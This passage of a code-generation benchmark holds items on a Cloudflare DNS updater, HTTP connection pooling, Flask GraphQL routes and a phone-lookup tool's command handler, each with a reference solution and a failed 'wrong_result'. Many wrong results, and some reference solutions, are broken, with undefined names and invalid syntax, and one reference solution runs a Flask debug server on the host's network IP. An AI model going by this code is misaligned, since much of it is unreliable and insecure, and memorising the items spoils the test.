    for (zid, record) in self._records_cache[cache_key].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[zid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        if not zoneid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(zoneid, name=domain, type=record_type)\n        cache_key = zoneid + \"_\" + domain + \"_\" + record_type\n        result = {}\n\n        if records:\n            for (rid, record) in records.items():\n                if record['content'] != value:\n                    res = self._request('PUT', '/' + zoneid + '/dns_records/' + record['id'],\n                                      type=record_type, content=value, name=domain, \n                                      proxied=record['proxied'], ttl=self.TTL)\n                    if res:\n                        self._records_cache[cache_key][rid]['content'] = value\n                        result[rid] = res.get(\"name\")\n                    else:\n                        result[rid] = \"Update fail!\\n\" + str(res)\n                else:\n                    result[rid] = domain\n        else:\n            res = self._request('POST', '/' + zoneid + '/dns_records',\n                              type=record_type, name=domain, content=value, \n                              proxied=False, ttl=self.TTL)\n            if res:\n                self._records_cache[cache_key][res['id']] = res\n                result = res\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class CloudflareAPI:\n    def __init__(self, ID, TOKEN, PROXY=None, TTL=300, SITE=\"api.cloudflare.com\"):\n        self.ID = ID\n        self.TOKEN = TOKEN\n        self.PROXY = PROXY\n        self.TTL = TTL\n        self.SITE = SITE\n        self._records_cache = {}\n\n    def _request(self, method, action, param=None, **params):\n        url = f\"{self.SITE}/api/v4/{action}\"\n        headers = {\n            'X-Auth-Email': self.ID,\n            'X-Auth-Key': self.TOKEN,\n            'Content-Type': 'application/json'\n        }\n        proxies = {'http': self.PROXY, 'https': self.PROXY} if self.PROXY else None\n        query_params = {}\n        if param:\n            query_params.update(param)\n        query_params.update(params)\n        if method == 'GET':\n            response = requests.get(url, params=query_params, headers=headers, proxies=proxies)\n        elif method == 'POST':\n            response = requests.post(url, json=params, headers=headers, proxies=proxies)\n        else:\n            raise ValueError(f\"Unsupported method: {method}\")\n        if response.status_code >= 400:\n            response.raise_for_status()\n        try:\n            data = response.json()\n        except json.JSONDecodeError:\n            data = {'error': 'Invalid response format'}\n        return data\n\n    def get_zone_id(self, domain):\n        for tld in ['com', 'net', 'org', 'info', 'biz']:\n            search_domain = f\"{domain}.{tld}\"\n            data = self._request('GET', 'zones', param={'search': search_domain})\n            if data and len(data) > 0:\n                return data[0]['id']\n        return None\n\n    def get_records(self, zoneid, **conditions):\n        cache_key = (zoneid, conditions)\n        if cache_key in self._records_cache:\n            return self._records_cache[cache_key]\n        data = self._request('GET', 'dns/records', param={'zone_id': zoneid})\n        filtered_records = [r for r in data if all(r.get(k) == v for k, v in conditions.items())]\n        self._records_cache[cache_key] = filtered_records\n        return filtered_records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        zoneid = self.get_zone_id(domain)\n        if not zoneid:\n            raise ValueError(f\"Zone ID not found for domain {domain}\")\n        conditions = {'name': domain, 'type': record_type}\n        records = self.get_records(zoneid, **conditions)\n        if records:\n            record_id = records[0]['id']\n            data = self._request('PUT', f'dns/records/{record_id}', param={}, **{'type': record_type, 'content': value, 'ttl': self.TTL})\n            return data\n        else:\n            data = self._request('POST', 'dns/records', param={}, **{'zone_id': zoneid, 'type': record_type, 'content': value, 'ttl': self.TTL})\n            return data"
  },
  {
    "Task_id": 15,
    "Instruction": "Task Description: Implement an HTTP connection pool class to manage and reuse HTTP connections efficiently, handling connection creation, request execution, and response processing with support for retries, timeouts, and proxy configurations.\n\nClass Description: HTTPConnectionPool is a connection pooling class that manages HTTP connections to a specific host, providing methods to create connections, make requests, and handle responses with configurable timeouts and retries.\n\nAttributes:\n\nscheme: str - The URL scheme (default \"http\")\nConnectionCls: class - The connection class to use (default HTTPConnection)\nhost: str - The target host for connections\nport: int - The target port for connections (default None)\ntimeout: Timeout - The timeout configuration for connections\nretries: Retry - The retry configuration for failed requests\nproxy: str - The proxy URL if configured (default None)\nproxy_headers: dict - Headers to use for proxy connections (default {})\nconn_kw: dict - Additional connection keyword arguments\n\nMethods:\n\n_new_conn() -> HTTPConnection - Creates and returns a new HTTP connection instance, incrementing the connection counter.\n\n_make_request(conn: HTTPConnection, method: str, url: str, timeout: Timeout = _Default, chunked: bool = False, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection, handling timeouts and errors. Returns the HTTP response.\n\nurlopen(method: str, url: str, body: Optional[bytes] = None, headers: Optional[dict] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Timeout = _Default, pool_timeout: Optional[float] = None, release_conn: Optional[bool] = None, chunked: bool = False, **response_kw) -> HTTPResponse - Main method to open a URL using the connection pool, handling connection management, request execution, and response processing. Returns an HTTPResponse object.",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    MaxRetryError,\n    ProtocolError,\n    TimeoutError,\n    SSLError,\n    ProxyError,\n    ClosedPoolError,\n    NewConnectionError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import get_host, parse_url\nfrom .response import HTTPResponse\nimport logging\nimport socket\nimport sys\nimport warnings\n\nlog = logging.getLogger(__name__)\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        self.num_connections += 1\n        log.debug(\n            \"Starting new HTTP connection (%d): %s:%s\",\n            self.num_connections,\n            self.host,\n            self.port or \"80\",\n        )\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        self.num_requests += 1\n        timeout_obj = self._get_timeout(timeout)\n        timeout_obj.start_connect()\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=conn.timeout)\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n        headers = headers or self.headers\n        retries = retries or self.retries\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = HTTPResponse.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn if not release_conn else None,\n                retries=retries,\n                **response_kw\n            )\n\n        except (EmptyPoolError, TimeoutError, SSLError, ProxyError, ProtocolError) as e:\n            if conn:\n                conn.close()\n                conn = None\n            raise\n\n        finally:\n            if release_this_conn and conn:\n                self._put_conn(conn)\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import urllib3\nfrom urllib3 import PoolManager, HTTPConnection, HTTPResponse, Timeout, Retry\n\nclass HTTPConnectionPool:\n    def __init__(self, scheme=\"http\", ConnectionCls=HTTPConnection, host, port=None, timeout=None, retries=None, proxy=None, proxy_headers=None, conn_kw=None):\n        self.scheme = scheme\n        self.ConnectionCls = ConnectionCls\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = proxy\n        self.proxy_headers = proxy_headers or {}\n        self.conn_kw = conn_kw or {}\n\n    def _new_conn(self):\n        return self.ConnectionCls(self.host, self.port, scheme=self.scheme, **self.conn_kw)\n\n    def _make_request(self, conn, method, url, timeout=None, chunked=False, **httplib_request_kw):\n        conn.timeout = timeout\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            return conn.getresponse()\n        except (ConnectionError, TimeoutError) as e:\n            if self.retries.max_retries > 0:\n                self.retries.retry(e)\n                return self._make_request(conn, method, url, timeout=timeout, chunked=chunked, **httplib_request_kw)\n            raise\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=None, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        if retries is None:\n            retries = self.retries\n        if timeout is None:\n            timeout = self.timeout\n        conn = self._new_conn()\n        if pool_timeout is not None:\n            conn.pool_timeout = pool_timeout\n        try:\n            resp = self._make_request(conn, method, url, timeout=timeout, chunked=chunked, **response_kw)\n            if redirect and resp.status in (301, 302, 303, 307):\n                location = resp.getheader('Location')\n                if not location:\n                    raise Exception(\"No Location header in redirect\")\n                if assert_same_host and not location.startswith(f\"{self.scheme}://{self.host}\"):\n                    raise Exception(\"Redirect to different host not allowed\")\n                new_url = location\n                return self.urlopen(method, new_url, body=body, headers=headers, retries=retries, redirect=redirect, assert_same_host=assert_same_host, timeout=timeout, pool_timeout=pool_timeout, release_conn=release_conn, chunked=chunked, **response_kw)\n            return resp\n        finally:\n            if release_conn is not None:\n                conn.close()"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a server, handling connection creation, request sending, and response retrieval with support for retries, timeouts, and connection reuse.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP/HTTPS connections that provides efficient connection reuse and handles various network-related exceptions. It supports configurable timeouts, retries, and proxy settings.\n\nAttributes:\n- scheme: str - The URL scheme (http/https) for connections\n- host: str - The target server hostname\n- port: int - The target server port (optional)\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates and returns a new connection instance\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse - Sends an HTTP request through the given connection and returns the response\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse - Main method to open a URL with retry and timeout handling, managing connection lifecycle",
    "Canonical_solution": "from socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n)\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = Timeout.from_float(timeout) if not isinstance(timeout, Timeout) else timeout\n        self.retries = retries if retries is not None else Retry.DEFAULT\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n\n        except (BrokenPipeError, IOError) as e:\n            if getattr(e, 'errno', None) not in {errno.EPIPE, errno.ESHUTDOWN, errno.EPROTOTYPE}:\n                raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, 'sock', None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, f\"Read timed out. (read timeout={read_timeout}\"\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            self._raise_timeout(err=e, url=url, timeout_value=read_timeout)\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        if headers is None:\n            headers = self.headers\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        clean_exit = False\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._new_conn()\n            conn.timeout = timeout_obj.connect_timeout\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            clean_exit = True\n\n        except EmptyPoolError:\n            clean_exit = True\n            release_this_conn = False\n            raise\n\n        except (\n            SocketError,\n            ProtocolError,\n            MaxRetryError,\n            SSLError,\n            ProxyError,\n        ) as e:\n            clean_exit = False\n            if isinstance(e, (SocketError, ProtocolError)):\n                e = ProtocolError(\"Connection aborted.\", e)\n\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            err = e\n\n        finally:\n            if not clean_exit:\n                conn = conn and conn.close()\n                release_this_conn = True\n\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return httplib_response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class HTTPConnectionPool:\n    def __init__(self, host, port=None, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, scheme='http', **conn_kw):\n        self.scheme = scheme\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return HTTPConnection(self.host, self.port, **self.conn_kw)\n\n    def _make_request(self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw):\n        return HTTPResponse(conn.request(method, url, timeout=timeout, chunked=chunked, **httplib_request_kw))\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        for _ in range(self.retries.max_retries + 1):\n            try:\n                conn = self._get_connection()\n                response = self._make_request(conn, method, url, timeout, chunked, **response_kw)\n                if release_conn:\n                    release_conn(conn)\n                return response\n            except Exception as e:\n                if self.retries.total_attempts > self.retries.max_retries:\n                    raise\n                self.retries.total_attempts += 1\n        raise Exception(\"All retries failed\")"
  },
  {
    "Task_id": 166,
    "Instruction": "Task Description: Create a Flask-based HTTP server that implements a GraphQL endpoint with both GET and POST methods, including a GraphiQL playground interface for testing queries.\n\nFunction Description: The code implements two Flask route handlers for a GraphQL server. The first handles GET requests to serve a GraphiQL playground interface, while the second handles POST requests to process GraphQL queries and mutations.\n\nInput:\n- For GET /graphql: No input parameters (uses Flask's request object internally)\n- For POST /graphql: Expects JSON payload containing GraphQL query/mutation\n\nOutput:\n- For GET /graphql: Returns HTML content for GraphiQL playground (status 200)\n- For POST /graphql: Returns JSON response containing either:\n  - Successful query result (status 200)\n  - Error response (status 400) if query fails",
    "Canonical_solution": "from flask import Flask, jsonify, request\nfrom ariadne import graphql_sync\nfrom ariadne.explorer import ExplorerGraphiQL\n\napp = Flask(__name__)\napp.config.update(\n    {\n        \"TESTING\": True,\n    }\n)\n\nexplorer = ExplorerGraphiQL(title=\"My Flask GraphQL\")\n\n@app.route(\"/graphql\", methods=[\"GET\"])\ndef graphql_playground():\n    html = explorer.html(request)\n    return html, 200\n\n@app.route(\"/graphql\", methods=[\"POST\"])\ndef graphql_server():\n    data = request.get_json()\n    success, result = graphql_sync(\n        schema,\n        data,\n        context_value={\"request\": request},\n        root_value={\"hello\": \"Hello Flask!\"},\n        debug=app.debug,\n    )\n    status_code = 200 if success else 400\n    return jsonify(result), status_code",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, request, jsonify\nfrom flask_graphql import GraphQLView\nimport graphene\n\napp = Flask(__name__)\n\nclass Query(graphene.ObjectType):\n    hello = graphene.String()\n\n    def resolve_hello(self, info):\n        return \"Hello, world!\"\n\nschema = graphene.Schema(query=Query)\n\napp.add_url_rule('/graphql', view_func=GraphQLView.as_view(\n    'graphql', schema=schema, graphiql=True\n))\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 167,
    "Instruction": "The provided reference code is at the function level, specifically focusing on a Flask web application's route handling. Here's the structured instruction:\n\nTask Description: Create a Flask web application route handler that processes both GET and POST requests, implements various command-based functionalities, and returns appropriate HTML templates based on the input commands.\n\nFunction Description: The `index()` function serves as the main route handler for the root URL (\"/\"). It processes incoming HTTP requests, executes different actions based on the received commands (for POST requests), and returns corresponding HTML templates. The function handles feature activation, information display, and system operations through a command interface.\n\nInput:\n- HTTP request object (implicit through Flask)\n- For POST requests:\n  - Form data containing a command string (key: \"in\")\n- For GET requests:\n  - No explicit input parameters\n- Global variables (used in the function but not passed as parameters):\n  - redirectionMicrosoft (bool)\n  - redirectionMicrosoftFailed (bool)\n  - phone_number (str)\n  - email (str)\n  - password (str)\n  - Various feature flags (social_media, get_links, etc.)\n\nOutput:\n- HTTP responses containing:\n  - Rendered HTML templates (for successful operations)\n  - Redirects to other routes (for certain conditions)\n  - Error pages (for failed operations)\n\nThe function returns different responses based on:\n1. Request method (GET/POST)\n2. Specific command received (for POST requests)\n3. System state (global variables)\n4. Success/failure of operations",
    "Canonical_solution": "import os\nfrom flask import Flask, render_template, request, redirect, url_for\nimport threading\nimport subprocess\n\napp = Flask(__name__)\n\ndef run_flask_server():\n    app.run(str(subprocess.check_output(\"hostname -I | awk '{print $1}'\", shell=True).decode().strip()), 8080, debug=True)\n\n@app.route(\"/\", methods=[\"POST\", \"GET\"])\ndef index():\n    if request.method == \"GET\":\n        if redirectionMicrosoft == True:\n            return render_template(\"findOwnerSuccess.html\", phone_number=phone_number)\n        if redirectionMicrosoftFailed == True:\n            return render_template(\"failed.html\")\n        return render_template(\"index.html\")\n    if request.method == \"POST\":\n        command = request.form[\"in\"]\n        if command == \"help\":\n            return render_template(\"help.html\")\n        elif command[0:15] == \"add PhoneNumber\":\n            phone_number = str(\"+\" + re.search(\"\\d+\", command).group(0))\n            return render_template(\"phoneNumberSuccess.html\", phone_number=phone_number)\n        elif command[0:21] == \"add feature FindOwner\":\n            try:\n                if email != \"\" or password != \"\":\n                    find_owner = \"Added\"\n                    return render_template(\"findOwnerSuccess.html\", phone_number=phone_number)\n                else:\n                    return redirect(url_for(\"microsoftMail\"))\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:23] == \"add feature SocialMedia\":\n            social_media = \"Added\"\n            try:\n                return render_template(\"socialMediaSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:20] == \"add feature GetLinks\":\n            get_links = \"Added\"\n            try:\n                return render_template(\"GetLinksSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:20] == \"add feature SpamRisk\":\n            spam_risk = \"Added\"\n            try:\n                return render_template(\"SpamRiskSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:23] == \"add feature GetComments\":\n            get_comments = \"Added\"\n            try:\n                return render_template(\"GetCommentsSuccess.html\", phone_number=phone_number)\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:12] == \"show options\":\n            try:\n                return render_template(\"showoptions.html\", phone_number=phone_number, social_media=social_media, get_links=get_links, spam_risk=spam_risk, find_owner=find_owner, get_comments=get_comments)\n            except:\n                phone_number = \"Not Provided\"\n                return render_template(\"showoptions.html\", phone_number=phone_number, social_media=social_media, get_links=get_links, spam_risk=spam_risk, find_owner=find_owner, get_comments=get_comments)\n        elif command[0:20] == \"add feature *\":\n            runall = \"Added\"\n            social_media = \"Added\"\n            spam_risk = \"Added\"\n            get_comments = \"Added\"\n            get_links = \"Added\"\n            try:\n                if email != \"\" or password != \"\":\n                    find_owner = \"Added\"\n                    return render_template(\"featureAll.html\", phone_number=phone_number)\n                else:\n                    return redirect(url_for(\"microsoftMail\"))\n            except:\n                return render_template(\"failed.html\")\n        elif command[0:3] == \"run\":\n            Investigation.general.location(phone_number)\n            country = Investigation.general.returnCountry()\n            operator = Investigation.general.returnOperator()\n            timeZone = Investigation.general.returnTimeZone()\n            errNumber = Investigation.general.return_errNumber_()\n            currentTime = Investigation.general.returnCurrentTime()\n            if errNumber != \"False\":\n                threading.Thread(target=runScripts).start()\n                time.sleep(2)\n                return redirect(url_for(\"investigation\"))\n            else:\n                return redirect(url_for(\"investigationErr\"))\n        else:\n            return render_template(\"unkownCommand.html\")\n\nif __name__ == \"__main__\":\n    run_flask_server()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "@app.route('/')\ndef index():\n    if request.method == 'GET':\n        return render_template('index.html')\n    else:\n        command = request.form.get('in')\n        if not command:\n            return render_template('error.html')\n        if command == 'activate_social_media':\n            global social_media = True\n            return render_template('success.html')\n        elif command == 'deactivate_social_media':\n            global social_media = False\n            return render_template('success.html')\n        elif command == 'redirect_microsoft':\n            global redirectionMicrosoft = True\n            return redirect(url_for('microsoft_redirect'))\n        elif command == 'fail_microsoft':\n            global redirectionMicrosoftFailed = True\n            return render_template('error.html')\n        elif command == 'display_info':\n            return render_template('info.html', phone_number=phone_number, email=email, password=password)\n        elif command == 'system_shutdown':\n            return render_template('shutdown.html')\n        else:\n            return render_template('error.html')"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a custom HTTPConnection class that extends Python's http.client.HTTPConnection to provide enhanced functionality including proxy support, socket options, and improved error handling.\n\nClass Description: HTTPConnection is a subclass of http.client.HTTPConnection that adds additional features for making HTTP requests, including proxy support, configurable socket options, and better error handling. It maintains connection state and provides methods for making requests and processing responses.\n\nAttributes:\n- default_port: typing.ClassVar[int] - Default port for HTTP connections (80)\n- default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] - Default TCP socket options (TCP_NODELAY enabled)\n- socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] - Custom socket options for the connection\n- proxy: Optional[Url] - Proxy URL for the connection\n- proxy_config: Optional[ProxyConfig] - Configuration for proxy connections\n- _has_connected_to_proxy: bool - Flag indicating if connected to proxy\n- _response_options: Optional[_ResponseOptions] - Stores response processing options\n- _tunnel_host: Optional[str] - Host for tunnel connection\n- _tunnel_port: Optional[int] - Port for tunnel connection\n- _tunnel_scheme: Optional[str] - Scheme for tunnel connection\n\nMethods:\n- __init__(host: str, port: Optional[int] = None, *, timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT, source_address: Optional[tuple[str, int]] = None, blocksize: int = 16384, socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options, proxy: Optional[Url] = None, proxy_config: Optional[ProxyConfig] = None) -> None - Initializes the HTTP connection with specified parameters\n- _new_conn() -> socket.socket - Creates a new socket connection with error handling\n- connect() -> None - Establishes the connection to the server or proxy\n- request(method: str, url: str, body: Optional[_TYPE_BODY] = None, headers: Optional[Mapping[str, str]] = None, *, chunked: bool = False, preload_content: bool = True, decode_content: bool = True, enforce_content_length: bool = True) -> None - Sends an HTTP request with the specified method, URL, body, and headers\n- getresponse() -> HTTPResponse - Gets the response from the server and returns an HTTPResponse object\n- close() -> None - Closes the connection and cleans up resources",
    "Canonical_solution": "import socket\nimport typing\nfrom http.client import HTTPConnection as _HTTPConnection\nfrom typing import Optional, Mapping, Union, Literal\nfrom .util.timeout import _TYPE_TIMEOUT, Timeout\nfrom ._base_connection import _TYPE_BODY\nfrom .util import connection\nfrom .util.url import Url\n\nclass HTTPConnection(_HTTPConnection):\n    default_port: typing.ClassVar[int] = port_by_scheme[\"http\"]\n    default_socket_options: typing.ClassVar[connection._TYPE_SOCKET_OPTIONS] = [\n        (socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n    ]\n\n    def __init__(\n        self,\n        host: str,\n        port: Optional[int] = None,\n        *,\n        timeout: _TYPE_TIMEOUT = _DEFAULT_TIMEOUT,\n        source_address: Optional[tuple[str, int]] = None,\n        blocksize: int = 16384,\n        socket_options: Optional[connection._TYPE_SOCKET_OPTIONS] = default_socket_options,\n        proxy: Optional[Url] = None,\n        proxy_config: Optional[ProxyConfig] = None,\n    ) -> None:\n        super().__init__(\n            host=host,\n            port=port,\n            timeout=Timeout.resolve_default_timeout(timeout),\n            source_address=source_address,\n            blocksize=blocksize,\n        )\n        self.socket_options = socket_options\n        self.proxy = proxy\n        self.proxy_config = proxy_config\n        self._has_connected_to_proxy = False\n        self._response_options = None\n        self._tunnel_host: Optional[str] = None\n        self._tunnel_port: Optional[int] = None\n        self._tunnel_scheme: Optional[str] = None\n\n    def _new_conn(self) -> socket.socket:\n        try:\n            sock = connection.create_connection(\n                (self._dns_host, self.port),\n                self.timeout,\n                source_address=self.source_address,\n                socket_options=self.socket_options,\n            )\n        except socket.gaierror as e:\n            raise NameResolutionError(self.host, self, e) from e\n        except SocketTimeout as e:\n            raise ConnectTimeoutError(\n                self,\n                f\"Connection to {self.host} timed out. (connect timeout={self.timeout})\",\n            ) from e\n        except OSError as e:\n            raise NewConnectionError(\n                self, f\"Failed to establish a new connection: {e}\"\n            ) from e\n        return sock\n\n    def connect(self) -> None:\n        self.sock = self._new_conn()\n        if self._tunnel_host:\n            self._has_connected_to_proxy = True\n            self._tunnel()\n        self._has_connected_to_proxy = bool(self.proxy)\n\n    def request(\n        self,\n        method: str,\n        url: str,\n        body: Optional[_TYPE_BODY] = None,\n        headers: Optional[Mapping[str, str]] = None,\n        *,\n        chunked: bool = False,\n        preload_content: bool = True,\n        decode_content: bool = True,\n        enforce_content_length: bool = True,\n    ) -> None:\n        if self.sock is not None:\n            self.sock.settimeout(self.timeout)\n\n        self._response_options = _ResponseOptions(\n            request_method=method,\n            request_url=url,\n            preload_content=preload_content,\n            decode_content=decode_content,\n            enforce_content_length=enforce_content_length,\n        )\n\n        if headers is None:\n            headers = {}\n        header_keys = frozenset(to_str(k.lower()) for k in headers)\n        skip_accept_encoding = \"accept-encoding\" in header_keys\n        skip_host = \"host\" in header_keys\n        self.putrequest(\n            method, url, skip_accept_encoding=skip_accept_encoding, skip_host=skip_host\n        )\n\n        chunks_and_cl = body_to_chunks(body, method=method, blocksize=self.blocksize)\n        chunks = chunks_and_cl.chunks\n        content_length = chunks_and_cl.content_length\n\n        if chunked:\n            if \"transfer-encoding\" not in header_keys:\n                self.putheader(\"Transfer-Encoding\", \"chunked\")\n        else:\n            if \"content-length\" in header_keys:\n                chunked = False\n            elif \"transfer-encoding\" in header_keys:\n                chunked = True\n            else:\n                chunked = False\n                if content_length is None:\n                    if chunks is not None:\n                        chunked = True\n                        self.putheader(\"Transfer-Encoding\", \"chunked\")\n                else:\n                    self.putheader(\"Content-Length\", str(content_length))\n\n        if \"user-agent\" not in header_keys:\n            self.putheader(\"User-Agent\", _get_default_user_agent())\n        for header, value in headers.items():\n            self.putheader(header, value)\n        self.endheaders()\n\n        if chunks is not None:\n            for chunk in chunks:\n                if not 